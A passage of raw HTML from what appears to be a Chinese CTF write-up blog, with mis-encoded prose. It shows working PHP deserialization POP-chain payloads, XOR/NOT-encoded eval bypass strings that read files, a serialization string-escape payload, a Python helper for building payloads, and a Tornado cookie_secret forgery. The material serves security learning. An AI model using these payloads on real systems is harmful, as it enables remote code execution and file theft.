class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;local = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$superhacker</span> = <span class="string">&quot;http://127.0.0.1:65500/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b=<span class="string">&quot;local&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="variable">$b</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//a:2:&#123;s:1:&quot;a&quot;;O:8:&quot;Backdoor&quot;:3:&#123;s:1:&quot;a&quot;;O:10:&quot;FileViewer&quot;:3:&#123;s:10:&quot;black_list&quot;;s:3:&quot;111&quot;;s:5:&quot;local&quot;;s:23:&quot;http://127.0.0.1:65500/&quot;;s:4:&quot;path&quot;;s:8:&quot;flag.php&quot;;&#125;s:1:&quot;b&quot;;s:5:&quot;local&quot;;s:11:&quot;superhacker&quot;;s:23:&quot;http://127.0.0.1:65500/&quot;;&#125;s:1:&quot;a&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>ç”¨åˆ°gcå›æ”¶æœºåˆ¶ç­‰</p><h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosÃ© will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»•è¿‡ä¸¤ä¸ªifå³å¯å®ç°å‘½ä»¤æ‰§è¡Œ</p><p>é¦–å…ˆçœ‹çœ‹è¿‡æ»¤çš„ä¸œè¥¿ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00-\x20ï¼Œ0-1ï¼Œ&#x27;&quot;`$&amp;.,|[]&#123;_defgops&#125;+å’Œ\x7F</span><br></pre></td></tr></table></figure><p>å†çœ‹ä¸‹é¢çš„ifï¼Œcount_charsç¬¬äºŒä¸ªå‚æ•°ä¸º3ï¼Œ</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218143940345.png" alt="image-20241218143940345" style="zoom:67%;" /><p>ä¹Ÿå°±æ˜¯ä¸èƒ½ä½¿ç”¨è¶…è¿‡13ç§å­—ç¬¦ï¼ã€</p><p>æ¥ä¸‹æ¥ï¼Œæœ‰ä¸€ç§åŠæ³•å¯ä»¥çœ‹æˆ‘ä»¬åˆ°åº•å¯ä»¥ç”¨å“ªäº›å†…ç½®å‡½æ•°ï¼ï¼ï¼å¥½åŠæ³•ï¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span>=<span class="title function_ invoke__">get_defined_functions</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$array</span>[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$arr</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$arr</span>) )<span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )<span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$arr</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218144520020.png" alt="image-20241218144520020"></p><p>è·å–å¯ç”¨å‡½æ•°</p><p>ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰å‘ç°å¯ä¾›æˆ‘ä»¬ä½¿ç”¨çš„å‡½æ•°ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æ¥ç€çœ‹è¿‡æ»¤ï¼Œå‘ç°å¼‚æˆ–ï¼Œå–åä¹‹ç±»çš„æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥è€ƒè™‘ç”¨ä»–ä»¬æ¥ç»•è¿‡ã€‚</p><p>å°è¯•å–å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~(&#x27;phpinfo&#x27;));</span><br><span class="line">//%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150653705.png" alt="image-20241218150653705"></p><p>æˆåŠŸæ‰§è¡Œphpinfo</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥çœ‹çœ‹disable function</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150726126.png" alt="image-20241218150726126"></p><p>print_r()ï¼Œscandir()ä¹‹ç±»çš„å¯ä»¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~(&#x27;print_r&#x27;));</span><br><span class="line">//%8F%8D%96%91%8B%A0%8D</span><br><span class="line">echo urlencode(~(&#x27;scandir&#x27;));</span><br><span class="line">//%8C%9C%9E%91%9B%96%8D</span><br><span class="line">echo urlencode(~(&#x27;.&#x27;));</span><br><span class="line">//%D1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)(~%D1));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ€»å…±15ä¸ªå­—ç¬¦ï¼Œè¶…è¿‡äº†ä¸¤ä¸ª</p><p>ä½†æ˜¯è¿™é‡Œå­—ç¬¦ç§ç±»è¶…è¿‡é™åˆ¶ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">en</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">ord</span>(s) ^ <span class="number">0xff</span>)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="string">&#x27;printrscandir&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> p:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> p:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(j) ^ <span class="built_in">ord</span>(k) ^ <span class="built_in">ord</span>(m) == <span class="built_in">ord</span>(i):</span><br><span class="line">                    <span class="keyword">if</span>(j == k <span class="keyword">or</span> j == m <span class="keyword">or</span> m == k):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(i+<span class="string">&#x27;==&#x27;</span>+j + <span class="string">&#x27;^&#x27;</span> + k + <span class="string">&#x27;^&#x27;</span>+m, end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(</span><br><span class="line">                            <span class="string">&#x27;&#123;:0&gt;2&#125;  =&gt;  [&quot;&#123;:0&gt;2&#125;&quot;,&quot;&#123;:0&gt;2&#125;&quot;,&quot;&#123;:0&gt;2&#125;&quot;]&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                                en(i), en(j), en(k), en(m)))</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n==d^i^c91  =&gt;  [&quot;9b&quot;,&quot;96&quot;,&quot;9c&quot;]</span><br><span class="line">p==r^a^c8f  =&gt;  [&quot;8d&quot;,&quot;9e&quot;,&quot;9c&quot;]</span><br><span class="line">t==d^s^c8b  =&gt;  [&quot;9b&quot;,&quot;8c&quot;,&quot;9c&quot;]</span><br></pre></td></tr></table></figure><p>print_r(scandir(â€˜.â€™))</p><p>å¾€ä¸‹å˜ï¼šä»¥ä¸‹ä¸¤ç§éƒ½è¡Œï¼Œå¯ä»¥æ„é€ å¾ˆå¤šå¾ˆå¤šç§ï¼Œæ›¿æ¢å“ªç§éƒ½æ²¡äº‹ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%96%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%8c%ff%ff%ff)^(%ff%ff%ff%8b%ff%ff%ff))(((%8c%9c%9c%96%8c%96%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%8f%8c%9c%ff%ff)^(%ff%ff%8d%8b%8b%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8d%8d%96%9b%9b%a0%8d)^(%9e%ff%ff%96%8c%ff%ff)^(%9c%ff%ff%9c%9c%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%8d)^(%ff%ff%ff%96%ff%ff%ff)^(%ff%ff%ff%9c%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218164943899.png" alt="image-20241218164943899"></p><p>æƒ³è¦è¯»å–çš„è¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(&#x27;.&#x27;)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">((%8D%9A%9E%9B%99%96%93%9A)^(%ff%ff%ff%ff%ff%ff%ff))</span><br><span class="line">((%9A%91%9B)^(%ff%ff%ff))</span><br><span class="line">((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))</span><br><span class="line">((%D1)^(%ff))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d==l^a^i9b  =&gt;  [&quot;93&quot;,&quot;9e&quot;,&quot;96&quot;]</span><br><span class="line">i==f^n^a96  =&gt;  [&quot;99&quot;,&quot;91&quot;,&quot;9e&quot;]</span><br><span class="line">c==a^l^n9c  =&gt;  [&quot;9e&quot;,&quot;93&quot;,&quot;91&quot;]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff)));</span><br></pre></td></tr></table></figure><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸å¤ªæ¸…æ¥šè¿™ä¸ªåºåˆ—åŒ–åæ˜¯é•¿å•¥æ ·çš„ï¼Œæœ¬åœ°è·‘ä¸€ä¸‹çœ‹çœ‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:5:&quot;b1234&quot;;s:3:&quot;img&quot;;s:40:&quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;;&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªsha1æ˜¯éœ€è¦ç»•è¿‡çš„ï¼</p><p>ä½†æ˜¯è¿™è¦å’‹ç»•å•Šï¼Ÿå‘ç°æœ‰ä¸ªfilterä¼šè¿‡æ»¤æ‰å­—ç¬¦ä¸²ï¼Œå¯ä»¥è€ƒè™‘å­—ç¬¦ä¸²é€ƒé€¸ï¼ŒæŠŠimgé€ƒé€¸å‡ºæ¥ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ ï¼</p><p>å­˜åœ¨extract($_POST);å˜é‡è¦†ç›–ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;</span><br></pre></td></tr></table></figure><p>è¿™ä¿©éƒ½æ˜¯å¯æ§çš„ã€‚</p><p>functionå¯æ§ï¼Œæˆ‘ä»¬åœ¨é‡Œé¢å¼„imgç„¶åé—­åˆå°±è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”¨useræ¥è¿›è¡Œé€ƒé€¸ï¼Œåæ‰<code>&quot;;s:8:&quot;function&quot;;s:xx:&quot;</code>ï¼Œ23ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflagflagflagflagphp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸ªhintå°±æ˜¯d0g3_f1ag.php</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124913426.png" alt="image-20241220124913426" style="zoom:80%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124906163.png" alt="image-20241220124906163" style="zoom:80%;" /><p>okæ‹¿æäº†ã€‚&#x2F;d0g3_fllllllag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220125010556.png" alt="image-20241220125010556" style="zoom:80%;" /><p>NSSCTF{eb4bcc79-d54c-4437-af0a-d13b88c05373}</p><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>æ‰“å¼€é¡µé¢æœ‰ä¸‰ä¸ªè¶…é“¾æ¥ï¼Œé›†æˆä¸€ä¸‹ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">fa7aa3ea2a63d3e3f984fc2f952b9d95</span><br><span class="line"></span><br><span class="line">/hints.txt</span><br><span class="line">9dd148c6b068df197ef0c4d592565839</span><br><span class="line"></span><br><span class="line">/flag.txt</span><br><span class="line">7f5f6f0a3e742f57e0c66c6e2989e494</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">md5(cookie_secret+md5(filename))</span><br><span class="line"></span><br><span class="line">/fllllllllllllag</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦è·å–cookie_secretçš„å€¼</p><p>è€Œæˆ‘ä»¬æŸ¥å®˜æ–¹æ–‡æ¡£ï¼Œtornadoåœ¨æ­å»ºä¸€ä¸ªç½‘ç«™æ—¶ï¼Œè‚¯å®šä¼šæœ‰å¤šä¸ªhandlerï¼Œè€Œè¿™äº›handleréƒ½æ˜¯RequestHandlerçš„å­ç±»</p><p>RequestHandler.settingsåˆæŒ‡å‘self.application.settings</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯´handler.settingsæŒ‡å‘äº†RequestHandler.settingsäº†ï¼Œå¯¹å§</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220205948150.png" alt="image-20241220205948150"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">128f7343-bd58-429c-80c6-c72b604e2aaf</span><br></pre></td></tr></table></figure><p>ç„¶åéªŒè¯ä¸€ä¸‹ï¼Œç”¨flag.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt md5 =&gt; 40dfb7391c19a66939e6b6f4e9898804</span><br><span class="line">2f02cee7-4944-4208-9af2-fae3dad9ce3740dfb7391c19a66939e6b6f4e9898804</span><br><span class="line">9c2b962c16d37c4d7e8d2731f5d589b4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2f02cee7-4944-4208-9af2-fae3dad9ce373bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">256ccf8b76c09059ce6fa48edd653af9</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220210832925.png" alt="image-20241220210832925"></p><h2 id="BJDCTF-2020-Cookie-is-so-subtle"><a href="#BJDCTF-2020-Cookie-is-so-subtle" class="headerlink" title="[BJDCTF 2020]Cookie is so subtle!"></a>[BJDCTF 2020]Cookie is so subtle!</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130223596.png" alt="image-20241221130223596"></p><p>flagç•Œé¢å­˜åœ¨sstiï¼Œæ˜¯twigæ¨¡æ¿å¼•æ“çš„ssti</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130251349.png" alt="image-20241221130251349" style="zoom: 67%;" 